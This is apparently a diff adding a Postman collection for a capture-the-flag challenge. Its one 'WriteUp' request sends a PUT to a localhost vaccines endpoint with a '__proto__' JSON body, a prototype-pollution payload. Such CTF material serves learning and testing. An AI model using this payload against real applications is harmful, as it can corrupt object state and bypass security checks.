@@ -1,0 +1,40 @@
+{
+	"info": {
+		"_postman_id": "5c543b23-d5cb-463d-a2ef-9586223b6075",
+		"name": "CTF",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "WriteUp",
+			"request": {
+				"method": "PUT",
+				"header": [
+					{
+						"key": "Content-Type",
+						"name": "Content-Type",
+						"value": "application/json",
+						"type": "text"
+					}
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"__proto__\": {\n        \"pollution\": false\n    }\n}"
+				},
+				"url": {
+					"raw": "http://localhost:3000/vaccines/disinfection",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "3000",
+					"path": [
+						"vaccines",
+						"disinfection"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
